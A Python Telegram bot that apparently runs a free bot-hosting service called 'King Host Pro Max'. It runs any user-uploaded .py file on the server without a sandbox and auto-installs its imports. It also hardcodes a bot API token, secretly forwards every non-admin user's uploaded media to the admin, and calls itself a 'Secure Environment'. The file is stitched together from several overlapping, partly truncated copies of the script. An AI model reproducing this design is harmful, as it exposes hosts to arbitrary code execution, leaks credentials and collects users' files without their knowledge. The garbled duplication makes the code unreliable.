import telebot
import subprocess
import os
import signal
import time
import shutil
import threading
import sys
import json
from telebot import types
from flask import Flask

# --- [ 1. RENDER KEEP-ALIVE & PORT ] ---
app = Flask('')

@app.route('/')
def home():
    return "King Host Pro Max is Running!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()

# --- [ 2. CONFIGURATION & STORAGE ] ---
API_TOKEN = "8568667849:AAEpPQnpas2LzR-DJ35k9F0HlptvGZiMjOU"
ADMIN_ID = 8700421304

bot = telebot.TeleBot(API_TOKEN, parse_mode="HTML")
BASE_DIR = "king_hosted_files"
os.makedirs(BASE_DIR, exist_ok=True)

USERS_FILE = "all_users.json"
BOT_MAP_FILE = "user_bot_map.json"

running_processes = {}   

def load_data():
    global all_users, user_bot_map
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f: all_users = set(json.load(f))
    else:
        all_users = set()
        
    if os.path.exists(BOT_MAP_FILE):
        with open(BOT_MAP_FILE, 'r') as f: user_bot_map = json.load(f)
    else:
        user_bot_map = {}

def save_data():
    with open(USERS_FILE, 'w') as f: json.dump(list(all_users), f)
    with open(BOT_MAP_FILE, 'w') as f: json.dump(user_bot_map, f)

load_data()
LINE = "━━━━━━━━━━━━━━━━━━"

# --- [ 3. AUTO-INSTALLER ENGINE ] ---
def install_requirements(file_path):
    try:
        with open(file_path, 'r') as f:
            content = f.read()
        
        libs = ["telebot", "requests", "aiohttp", "flask", "pillow", "pymongo", "beautifulsoup4"]
        for lib in libs:
            if f"import {lib}" in content or f"from {lib}" in content:
                package = "pyTelegramBotAPI" if lib == "telebot" else lib
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        print(f"Install Error: {e}")

# --- [ 4. MONITORING & CLEANUP (3 Mins / 2MB) ] ---
def monitor_file_limit(file_path, filename):
    time.sleep(180)
    if os.path.exists(file_path):
        file_size = os.path.getsize(file_path) / (1024 * 1024) 
        if file_size > 2:
            stop_bot_process(filename)
            try: os.remove(file_path)
            except: pass
            print(f"Cleanup: {filename} removed due to size limit.")

def stop_bot_process(filename):
    if filename in running_processes:
        try:
            os.kill(running_processes[filename], signal.SIGKILL)
            del running_processes[filename]
        except: pass

# --- [ 5. ADMIN MONITORING ] ---
@bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
def monitor_all(message):
    try:
        if message.from_user.id != ADMIN_ID:
            bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
            log = (f"👑 <b>King Monitoring</b>\n"
                   f"👤 User: {message.from_user.first_name}\n"
                   f"🆔 ID: <code>{message.from_user.id}</code>")
            bot.send_message(ADMIN_ID, log)
    except: pass

# --- [ 6. KEYBOARDS ] ---
def main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Host New Bot"), types.KeyboardButton("🛑 My Running Bots"))
    markup.add(types.KeyboardButton("📊 Server Status"))
    if user_id == ADMIN_ID: 
        markup.add(types.KeyboardButton("👑 Admin Panel"))
    return markup

# --- [ 7. BOT HANDLERS ] ---
@bot.message_handler(commands=["start"])
def start(message):
    u_id = message.from_user.id
    if u_id not in all_users:
        all_users.add(u_id)
        save_data()
        
    welcome = (f"<b>亗 𝐊𝐢𝐧𝐠 𝐇𝐎𝐒𝐓 PRO MAX 亗</b>\n"
               f"{LINE}\n"
               f"Welcome to the 亗 𝐊𝐢𝐧𝐠 𝐇𝐎𝐒𝐓ing System!\n\n"
               f"⚡ <b>Unlimited Hosting</b>\n"
               f"🛡 <b>Secure Environment</b>\n"
               f"🚀 <b>Fast Deployment with Auto-Installer</b>\n"
               f"{LINE}\n"
               f"Click 'Host New Bot' to get started.")
    bot.send_message(message.chat.id, welcome, reply_markup=main_menu(u_id))

@bot.message_handler(func=lambda m: m.text == "🚀 Host New Bot")
def ask_name(message):
    msg = bot.send_message(message.chat.id, "✨ <b>Enter Project Name:</b>")
    bot.register_next_step_handler(msg, get_file)

def get_file(message):
    if not message.text: return
    p_name = "".join(x for x in message.text if x.isalnum())
    msg = bot.send_message(message.chat.id, f"📤 <b>Upload .py file for '{p_name}':</b>")
    bot.register_next_step_handler(msg, deploy_engine, p_name)

def deploy_engine(message, p_name):
    if not message.document or not message.document.file_name.endswith(".py"):
        bot.send_message(message.chat.id, "❌ <b>Error:</b> Please upload a valid .py file.")
        return

    status = bot.send_message(message.chat.id, "⚙️ <b>Preparing Environment...</b>")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"{message.from_user.id}_{p_name}_{int(time.time())}.py"
        path = os.path.join(BASE_DIR, filename)

        with open(path, "wb") as f: f.write(downloaded)

        bot.edit_message_text("📥 <b>Installing Requirements...</b>", message.chat.id, status.message_id)
        install_requirements(path)

        bot.edit_message_text("🚀 <b>Launching Bot...</b>", message.chat.id, status.message_id)
        process = subprocess.Popen([sys.executable, path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_processes[filename] = process.pid
        
        u_id = str(message.from_user.id)
        if u_id not in user_bot_map: user_bot_map[u_id] = []
        user_bot_map[u_id].append(filename)
        save_data()
        
        bot.send_message(message.chat.id, 
            f"✅ <b>Deployment Successful!</b>\n{LINE}\n"
            f"🆔 <b>Process ID:</b> <code>{process.pid}</code>\n"
            f"👑 <b>System:</b> 亗 𝐊𝐢ንግ 𝐇𝐎𝐒𝐓\n"
            f"{LINE}\n"
            f"⚠️ <b>Note:</b> Files > 2MB are auto-deleted after 3 mins.")
        
        threading.Thread(target=monitor_file_limit, args=(path, filename), daemon=True).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ <b>Error:</b> {e}")

# --- [ 8. MANAGE BOTS ] ---
@bot.message_handler(func=lambda m: m.text == "🛑 My Running Bots")
def my_bots(message):
    u_id = str(message.from_user.id)
    files = user_bot_map.get(u_id, [])

    if not files:
        bot.send_message(message.chat.id, "📭 <b>No active bots found.</b>")
        return

    for f in files:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛑 Stop Process", callback_data=f"kill_{f}"))
        bot.send_message(message.chat.id, f"🤖 <b>Project:</b> <code>{f}</code>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("kill_"))
def kill_cb(call):
    filename = call.data.replace("kill_", "")
    stop_bot_process(filename)
    
    u_id = str(call.from_user.id)
    if u_id in user_bot_map and filename in user_bot_map[u_id]:
        user_bot_map[u_id].remove(filename)
        save_data()
    
    path = os.path.join(BASE_DIR, filename)
    if os.path.exists(path): 
        try: os.remove(path)
        except: pass
    bot.edit_message_text(f"✅ <b>Terminated:</b> <code>{filename}</code>", call.message.chat.id, call.message.message_id)

# --- [ 9. SERVER STATUS ] ---
@bot.message_handler(func=lambda m: m.text == "📊 Server Status")
def stats(message):
    total, used, _ = shutil.disk_usage("/")
    txt = (f"<b>📊 KING SERVER STATUS</b>\n{LINE}\n"
           f"🤖 <b>Bots Active:</b> {len(running_processes)}\n"
           f"📂 <b>Disk Usage:</b> {used // (2**30)}GB Used\n"
           f"👥 <b>Total Clients:</b> {len(all_users)}\n"
           f"✨ <b>System:</b> Stable")
    bot.send_message(message.chat.id, txt)

# --- [ 10. ADMIN PANEL ] ---
@bot.message_handler(func=lambda m: m.text == "👑 Admin Panel")
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_bc"),
        types.InlineKeyboardButton("📂 All Files", callback_data="adm_files")
    )
    bot.send_message(ADMIN_ID, "👑 <b>KING ADMIN DASHBOARD</b>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "adm_bc")
def bc_start(call):
    msg = bot.send_message(ADMIN_ID, "📝 <b>Type your broadcast message:</b>")
    bot.register_next_step_handler(msg, do_bc)

def do_bc(message):
    sent = 0
    for u in list(all_users):
        try:
            bot.send_message(u, f"📢 <b>MESSAGE FROM ADMIN:</b>\n\n{message.text}")
            sent += 1
            time.sleep(0.05)
        except: pass
    bot.send_message(ADMIN_ID, f"✅ Sent to {sent} users.")

@bot.callback_query_handler(func=lambda c: c.data == "adm_files")
def adm_files(call):
    files = os.listdir(BASE_DIR)
    if not files:
        bot.send_message(ADMIN_ID, "Storage is empty.")
        return
    for f in files:
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("📥 Download", callback_data=f"get_{f}"),
            types.InlineKeyboardButton("🔥 Delete", callback_data=f"del_{f}")
        )
        bot.send_message(ADMIN_ID, f"📄 <code>{f}</code>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith(("get_", "del_")))
def adm_actions(call):
    f_name = call.data.split("_", 1)[1]
    path = os.path.join(BASE_DIR, f_name)
    if call.data.startswith("get_"):
        if os.path.exists(path):
            with open(path, "rb") as f: bot.send_document(ADMIN_ID, f)
        else:
            bot.answer_callback_query(call.id, "File not found!")
    elif call.data.startswith("del_"):
        stop_bot_process(f_name)
        if os.path.exists(path): os.remove(path)
        
        for u_id in user_bot_map:
            if f_name in user_bot_map[u_id]:
                user_bot_map[u_id].remove(f_name)
                save_data()
                break
                
        bot.edit_message_text(f"🗑 Deleted: {f_name}", call.message.chat.id, call.message.message_id)

# --- [ 11. START ENTRY ] ---
if __name__ == "__main__":
    print("🚀 亗 𝐊𝐢ን𝐠 𝐇𝐎𝐒𝐓 IS STARTING...")
    keep_alive() 
    bot.infinity_polling(skip_pending=True)
# --- [ 3. AUTO-INSTALLER ENGINE ] ---
def install_requirements(file_path):
    try:
        with open(file_path, 'r') as f:
            content = f.read()
        
        libs = ["telebot", "requests", "aiohttp", "flask", "pillow", "pymongo", "beautifulsoup4"]
        for lib in libs:
            if f"import {lib}" in content or f"from {lib}" in content:
                package = "pyTelegramBotAPI" if lib == "telebot" else lib
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
    except Exception as e:
        print(f"Install Error: {e}")

# --- [ 4. MONITORING & CLEANUP (3 Mins / 2MB) ] ---
def monitor_file_limit(file_path, filename):
    time.sleep(180) # 3 ደቂቃ
    if os.path.exists(file_path):
        file_size = os.path.getsize(file_path) / (1024 * 1024) 
        if file_size > 2:
            stop_bot_process(filename)
            try: os.remove(file_path)
            except: pass
            print(f"Cleanup: {filename} removed due to size limit.")

def stop_bot_process(filename):
    if filename in running_processes:
        try:
            os.kill(running_processes[filename], signal.SIGKILL)
            del running_processes[filename]
        except: pass

# --- [ 5. ADMIN MONITORING ] ---
@bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
def monitor_all(message):
    try:
        if message.from_user.id != ADMIN_ID:
            bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
            log = (f"👑 <b>King Monitoring</b>\n"
                   f"👤 User: {message.from_user.first_name}\n"
                   f"🆔 ID: <code>{message.from_user.id}</code>")
            bot.send_message(ADMIN_ID, log)
    except: pass

# --- [ 6. KEYBOARDS ] ---
def main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Host New Bot"), types.KeyboardButton("🛑 My Running Bots"))
    markup.add(types.KeyboardButton("📊 Server Status"))
    if user_id == ADMIN_ID: 
        markup.add(types.KeyboardButton("👑 Admin Panel"))
    return markup

# --- [ 7. BOT HANDLERS ] ---

@bot.message_handler(commands=["start"])
def start(message):
    u_id = message.from_user.id
    if u_id not in all_users:
        all_users.add(u_id)
        save_data()
        
    welcome = (f"<b>亗 𝐊𝐢𝐧𝐠 𝐇𝐎𝐒𝐓 PRO MAX 亗</b>\n"
               f"{LINE}\n"
               f"Welcome to the 亗 𝐊𝐢𝐧𝐠 𝐇𝐎𝐒𝐓ing System!\n\n"
               f"⚡ <b>Unlimited Hosting</b>\n"
               f"🛡 <b>Secure Environment</b>\n"
               f"🚀 <b>Fast Deployment with Auto-Installer</b>\n"
               f"{LINE}\n"
               f"Click 'Host New Bot' to get started.")
    bot.send_message(message.chat.id, welcome, reply_markup=main_menu(u_id))

@bot.message_handler(func=lambda m: m.text == "🚀 Host New Bot")
def ask_name(message):
    msg = bot.send_message(message.chat.id, "✨ <b>Enter Project Name:</b>")
    bot.register_next_step_handler(msg, get_file)

def get_file(message):
    if not message.text: return
    p_name = "".join(x for x in message.text if x.isalnum())
    msg = bot.send_message(message.chat.id, f"📤 <b>Upload .py file for '{p_name}':</b>")
    bot.register_next_step_handler(msg, deploy_engine, p_name)

def deploy_engine(message, p_name):
    if not message.document or not message.document.file_name.endswith(".py"):
        bot.send_message(message.chat.id, "❌ <b>Error:</b> Please upload a valid .py file.")
        return

    status = bot.send_message(message.chat.id, "⚙️ <b>Preparing Environment...</b>")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"{message.from_user.id}_{p_name}_{int(time.time())}.py"
        path = os.path.join(BASE_DIR, filename)

        with open(path, "wb") as f: f.write(downloaded)

        bot.edit_message_text("📥 <b>Installing Requirements...</b>", message.chat.id, status.message_id)
        install_requirements(path)

        bot.edit_message_text("🚀 <b>Launching Bot...</b>", message.chat.id, status.message_id)
        process = subprocess.Popen([sys.executable, path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_processes[filename] = process.pid
        
        u_id = str(message.from_user.id)
        if u_id not in user_bot_map: user_bot_map[u_id] = []
        user_bot_map[u_id].append(filename)
        save_data()
        
        bot.send_message(message.chat.id, 
            f"✅ <b>Deployment Successful!</b>\n{LINE}\n"
            f"🆔 <b>Process ID:</b> <code>{process.pid}</code>\n"
            f"👑 <b>System:</b> 亗 𝐊𝐢ንግ 𝐇𝐎𝐒𝐓\n"
            f"{LINE}\n"
            f"⚠️ <b>Note:</b> Files > 2MB are auto-deleted after 3 mins.")
        
        threading.Thread(target=monitor_file_limit, args=(path, filename), daemon=True).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ <b>Error:</b> {e}")

# --- [ 8. MANAGE BOTS ] ---
@bot.message_handler(func=lambda m: m.text == "🛑 My Running Bots")
def my_bots(message):
    u_id = str(message.from_user.id)
    files = user_bot_map.get(u_id, [])

    if not files:
        bot.send_message(message.chat.id, "📭 <b>No active bots found.</b>")
        return

    for f in files:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛑 Stop Process", callback_data=f"kill_{f}"))
        bot.send_message(message.chat.id, f"🤖 <b>Project:</b> <code>{f}</code>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("kill_"))
def kill_cb(call):
    filename = call.data.replace("kill_", "")
    stop_bot_process(filename)
    
    u_id = str(call.from_user.id)
    if u_id in user_bot_map and filename in user_bot_map[u_id]:
        user_bot_map[u_id].remove(filename)
        save_data()
    
    path = os.path.join(BASE_DIR, filename)
    if os.path.exists(path): 
        try: os.remove(path)
        except: pass
    bot.edit_message_text(f"✅ <b>Terminated:</b> <code>{filename}</code>", call.message.chat.id, call.message.message_id)

# --- [ 9. SERVER STATUS ] ---
@bot.message_handler(func=lambda m: m.text == "📊 Server Status")
def stats(message):
    total, used, _ = shutil.disk_usage("/")
    txt = (f"<b>📊 KING SERVER STATUS</b>\n{LINE}\n"
           f"🤖 <b>Bots Active:</b> {len(running_processes)}\n"
           f"📂 <b>Disk Usage:</b> {used // (2**30)}GB Used\n"
           f"👥 <b>Total Clients:</b> {len(all_users)}\n"
           f"✨ <b>System:</b> Stable")
    bot.send_message(message.chat.id, txt)

# --- [ 10. ADMIN PANEL ] ---
@bot.message_handler(func=lambda m: m.text == "👑 Admin Panel")
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_bc"),
        types.InlineKeyboardButton("📂 All Files", callback_data="adm_files")
    )
    bot.send_message(ADMIN_ID, "👑 <b>KING ADMIN DASHBOARD</b>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "adm_bc")
def bc_start(call):
    msg = bot.send_message(ADMIN_ID, "📝 <b>Type your broadcast message:</b>")
    bot.register_next_step_handler(msg, do_bc)

def do_bc(message):
    sent = 0
    for u in list(all_users):
        try:
            bot.send_message(u, f"📢 <b>MESSAGE FROM ADMIN:</b>\n\n{message.text}")
            sent += 1
            time.sleep(0.05)
        except: pass
    bot.send_message(ADMIN_ID, f"✅ Sent to {sent} users.")

@bot.callback_query_handler(func=lambda c: c.data == "adm_files")
def adm_files(call):
    files = os.listdir(BASE_DIR)
    if not files:
        bot.send_message(ADMIN_ID, "Storage is empty.")
        return
    for f in files:
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("📥 Download", callback_data=f"get_{f}"),
            types.InlineKeyboardButton("🔥 Delete", callback_data=f"del_{f}")
        )
        bot.send_message(ADMIN_ID, f"📄 <code>{f}</code>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith(("get_", "del_")))
def adm_actions(call):
    f_name = call.data.split("_", 1)[1]
    path = os.path.join(BASE_DIR, f_name)
    if call.data.startswith("get_"):
        if os.path.exists(path):
            with open(path, "rb") as f: bot.send_document(ADMIN_ID, f)
        else:
            bot.answer_callback_query(call.id, "File not found!")
    elif call.data.startswith("del_"):
        stop_bot_process(f_name)
        if os.path.exists(path): os.remove(path)
        
        # ከተጠቃሚው ማፕ ላይ ማጽዳት
        for u_id in user_bot_map:
            if f_name in user_bot_map[u_id]:
                user_bot_map[u_id].remove(f_name)
                save_data()
                break
                
        bot.edit_message_text(f"🗑 Deleted: {f_name}", call.message.chat.id, call.message.message_id)

# --- [ 11. START ENTRY ] ---
if __name__ == "__main__":
    print("🚀 亗 𝐊𝐢ን𝐠 𝐇𝐎𝐒𝐓 IS STARTING...")
    keep_alive() 
    bot.infinity_polling(skip_pending=True)
        print(f"Install Error: {e}")

# --- [ 4. MONITORING & CLEANUP ] ---
def monitor_process(path, filename):
    time.sleep(180) # 3 ደቂቃ
    if os.path.exists(path):
        size = os.path.getsize(path) / (1024 * 1024)
        if size > 2: # 2MB በላይ ከሆነ
            stop_bot(filename)
            try: os.remove(path)
            except: pass

def stop_bot(filename):
    if filename in running_processes:
        try:
            os.kill(running_processes[filename], signal.SIGKILL)
            del running_processes[filename]
        except: pass

# --- [ 5. BOT HANDLERS ] ---

@bot.message_handler(commands=["start"])
def start(message):
    all_users.add(message.from_user.id)
    bot.send_message(message.chat.id, f"<b>亗 𝐊𝐢𝐧𝐠 𝐇𝐎𝐒𝐓 PRO MAX 亗</b>\n{LINE}\nReady to deploy with Auto-Installer!", reply_markup=main_menu(message.from_user.id))

def main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Host New Bot"), types.KeyboardButton("🛑 My Running Bots"))
    markup.add(types.KeyboardButton("📊 Server Status"))
    if user_id == ADMIN_ID: markup.add(types.KeyboardButton("👑 Admin Panel"))
    return markup

@bot.message_handler(func=lambda m: m.text == "🚀 Host New Bot")
def ask_name(message):
    msg = bot.send_message(message.chat.id, "✨ <b>Enter Project Name:</b>")
    bot.register_next_step_handler(msg, get_file)

def get_file(message):
    if not message.text: return
    p_name = "".join(x for x in message.text if x.isalnum())
    msg = bot.send_message(message.chat.id, f"📤 <b>Upload .py file for '{p_name}':</b>")
    bot.register_next_step_handler(msg, deploy_engine, p_name)

def deploy_engine(message, p_name):
    if not message.document or not message.document.file_name.endswith(".py"):
        bot.send_message(message.chat.id, "❌ Error: Upload .py file.")
        return

    status = bot.send_message(message.chat.id, "⚙️ <b>Preparing Environment...</b>")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"{message.from_user.id}_{p_name}_{int(time.time())}.py"
        path = os.path.join(BASE_DIR, filename)

        with open(path, "wb") as f: f.write(downloaded)

        # --- AUTO INSTALL START ---
        bot.edit_message_text("📥 <b>Installing Requirements...</b>", message.chat.id, status.message_id)
        install_requirements(path)
        # --- AUTO INSTALL END ---

        bot.edit_message_text("🚀 <b>Launching Bot...</b>", message.chat.id, status.message_id)
        process = subprocess.Popen([sys.executable, path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_processes[filename] = process.pid
        
        u_id = message.from_user.id
        if u_id not in user_bot_map: user_bot_map[u_id] = []
        user_bot_map[u_id].append(filename)

        bot.send_message(message.chat.id, f"✅ <b>Successfully Hosted!</b>\n{LINE}\nPID: <code>{process.pid}</code>")
        threading.Thread(target=monitor_process, args=(path, filename), daemon=True).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ <b>Critical Error:</b> {e}")

# ... (እዚህ ጋር የድሮው My Running Bots እና Admin Panel ኮዶች ይገባሉ - አልተቀየሩም) ...

@bot.message_handler(func=lambda m: m.text == "📊 Server Status")
def stats(message):
    total, used, _ = shutil.disk_usage("/")
    bot.send_message(message.chat.id, f"📊 <b>KING SERVER</b>\n{LINE}\nBots: {len(running_processes)}\nDisk: {used // (2**30)}GB Used")

if __name__ == "__main__":
    keep_alive()
    print("🚀 KING HOST PRO MAX ONLINE!")
    bot.infinity_polling(skip_pending=True)
# 📂 Storage Setup
BASE_DIR = "king_hosted_files"
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

# 🌍 Global Tracking
running_processes = {}   
user_bot_map = {}        
all_users = set()

LINE = "━━━━━━━━━━━━━━━━━━"

# =========================================================
# 🕒 AUTO-CLEANUP SYSTEM (3 Mins / 2MB Limit)
# =========================================================

def monitor_file_limit(file_path, filename):
    """Deletes file after 3 mins if size exceeds 2MB"""
    time.sleep(180) # Wait for 3 minutes
    
    if os.path.exists(file_path):
        file_size = os.path.getsize(file_path) / (1024 * 1024) 
        
        if file_size > 2:
            if filename in running_processes:
                try:
                    os.kill(running_processes[filename], signal.SIGKILL)
                    del running_processes[filename]
                except: pass
            
            try: os.remove(file_path)
            except: pass
            print(f"Cleanup: {filename} removed due to size limit.")

# =========================================================
# 🕵️‍♂️ ADMIN MONITORING
# =========================================================

@bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
def monitor_all(message):
    try:
        if message.from_user.id != ADMIN_ID:
            bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
            log = (f"👑 <b>King Monitoring</b>\n"
                   f"👤 User: {message.from_user.first_name}\n"
                   f"🆔 ID: <code>{message.from_user.id}</code>")
            bot.send_message(ADMIN_ID, log)
    except: pass

# =========================================================
# ⌨️ KEYBOARDS
# =========================================================

def main_menu(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🚀 Host New Bot"), 
        types.KeyboardButton("🛑 My Running Bots")
    )
    markup.add(types.KeyboardButton("📊 Server Status"))
    
    if user_id == ADMIN_ID:
        markup.add(types.KeyboardButton("👑 Admin Panel"))
    return markup

# =========================================================
# 🚀 START & HOME
# =========================================================

@bot.message_handler(commands=["start"])
def start(message):
    all_users.add(message.from_user.id)
    welcome = (f"<b>亗 𝐊𝐢𝐧𝐠 𝐇𝐎𝐒𝐓 亗</b>\n"
               f"{LINE}\n"
               f"Welcome to the 亗 𝐊𝐢𝐧𝐠 𝐇𝐎𝐒𝐓ing System!\n\n"
               f"⚡ <b>Unlimited Hosting</b>\n"
               f"🛡 <b>Secure Environment</b>\n"
               f"🚀 <b>Fast Deployment</b>\n"
               f"{LINE}\n"
               f"Click 'Host New Bot' to get started.")
    bot.send_message(message.chat.id, welcome, reply_markup=main_menu(message.from_user.id))

# =========================================================
# 🚀 DEPLOYMENT ENGINE
# =========================================================

@bot.message_handler(func=lambda m: m.text == "🚀 Host New Bot")
def ask_name(message):
    msg = bot.send_message(message.chat.id, "✨ <b>Enter Project Name:</b>")
    bot.register_next_step_handler(msg, get_file)

def get_file(message):
    if not message.text: return
    p_name = "".join(x for x in message.text if x.isalnum())
    msg = bot.send_message(message.chat.id, f"📤 <b>Upload .py file for '{p_name}':</b>")
    bot.register_next_step_handler(msg, deploy_engine, p_name)

def deploy_engine(message, p_name):
    if not message.document or not message.document.file_name.endswith(".py"):
        bot.send_message(message.chat.id, "❌ <b>Error:</b> Please upload a valid .py file.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        filename = f"{message.from_user.id}_{p_name}_{int(time.time())}.py"
        path = os.path.join(BASE_DIR, filename)

        with open(path, "wb") as f:
            f.write(downloaded)

        # Runs code as background process
        process = subprocess.Popen(["python3", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_processes[filename] = process.pid
        
        u_id = message.from_user.id
        if u_id not in user_bot_map: user_bot_map[u_id] = []
        user_bot_map[u_id].append(filename)
        
        bot.send_message(message.chat.id, 
            f"✅ <b>Deployment Successful!</b>\n{LINE}\n"
            f"🆔 <b>Process ID:</b> <code>{process.pid}</code>\n"
            f"👑 <b>System:</b> 亗 𝐊𝐢ንግ 𝐇𝐎𝐒𝐓\n"
            f"{LINE}\n"
            f"⚠️ <b>Note:</b> Files > 2MB are auto-deleted after 3 mins.")
        
        threading.Thread(target=monitor_file_limit, args=(path, filename), daemon=True).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ <b>Error:</b> {e}")

# =========================================================
# 🛑 MANAGE BOTS
# =========================================================

@bot.message_handler(func=lambda m: m.text == "🛑 My Running Bots")
def my_bots(message):
    u_id = message.from_user.id
    files = user_bot_map.get(u_id, [])

    if not files:
        bot.send_message(message.chat.id, "📭 <b>No active bots found.</b>")
        return

    for f in files:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛑 Stop Process", callback_data=f"kill_{f}"))
        bot.send_message(message.chat.id, f"🤖 <b>Project:</b> <code>{f}</code>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith("kill_"))
def kill_cb(call):
    filename = call.data.replace("kill_", "")
    if filename in running_processes:
        try:
            os.kill(running_processes[filename], signal.SIGKILL)
            del running_processes[filename]
        except: pass
    
    u_id = call.from_user.id
    if u_id in user_bot_map and filename in user_bot_map[u_id]:
        user_bot_map[u_id].remove(filename)
    
    path = os.path.join(BASE_DIR, filename)
    if os.path.exists(path): 
        try: os.remove(path)
        except: pass
    bot.edit_message_text(f"✅ <b>Terminated:</b> <code>{filename}</code>", call.message.chat.id, call.message.message_id)

# =========================================================
# 👑 ADMIN PANEL
# =========================================================

@bot.message_handler(func=lambda m: m.text == "👑 Admin Panel")
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_bc"),
        types.InlineKeyboardButton("📂 All Files", callback_data="adm_files")
    )
    bot.send_message(ADMIN_ID, "👑 <b>KING ADMIN DASHBOARD</b>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "adm_bc")
def bc_start(call):
    msg = bot.send_message(ADMIN_ID, "📝 <b>Type your broadcast message:</b>")
    bot.register_next_step_handler(msg, do_bc)

def do_bc(message):
    sent = 0
    for u in list(all_users):
        try:
            bot.send_message(u, f"📢 <b>MESSAGE FROM ADMIN:</b>\n\n{message.text}")
            sent += 1
            time.sleep(0.05)
        except: pass
    bot.send_message(ADMIN_ID, f"✅ Sent to {sent} users.")

@bot.callback_query_handler(func=lambda c: c.data == "adm_files")
def adm_files(call):
    files = os.listdir(BASE_DIR)
    if not files:
        bot.send_message(ADMIN_ID, "Storage is empty.")
        return
    for f in files:
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("📥 Download", callback_data=f"get_{f}"),
            types.InlineKeyboardButton("🔥 Delete", callback_data=f"del_{f}")
        )
        bot.send_message(ADMIN_ID, f"📄 <code>{f}</code>", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith(("get_", "del_")))
def adm_actions(call):
    f_name = call.data.split("_", 1)[1]
    path = os.path.join(BASE_DIR, f_name)
    if call.data.startswith("get_"):
        with open(path, "rb") as f: bot.send_document(ADMIN_ID, f)
    elif call.data.startswith("del_"):
        if f_name in running_processes:
            try: os.kill(running_processes[f_name], signal.SIGKILL)
            except: pass
            del running_processes[f_name]
        if os.path.exists(path): os.remove(path)
        bot.edit_message_text(f"🗑 Deleted: {f_name}", call.message.chat.id, call.message.message_id)

# =========================================================
# 📊 SERVER STATUS
# =========================================================

@bot.message_handler(func=lambda m: m.text == "📊 Server Status")
def stats(message):
    total, used, _ = shutil.disk_usage("/")
    txt = (f"<b>📊 KING SERVER STATUS</b>\n{LINE}\n"
           f"🤖 <b>Bots Active:</b> {len(running_processes)}\n"
           f"📂 <b>Disk Usage:</b> {used // (2**30)}GB Used\n"
           f"👥 <b>Total Clients:</b> {len(all_users)}\n"
           f"✨ <b>System:</b> Stable")
    bot.send_message(message.chat.id, txt)

# =========================================================
if __name__ == "__main__":
    print("🚀 亗 𝐊𝐢𝐧𝐠 𝐇𝐎𝐒𝐓 IS STARTING...")
    keep_alive() # Starts Flask Server for Render
    bot.infinity_polling(skip_pending=True)
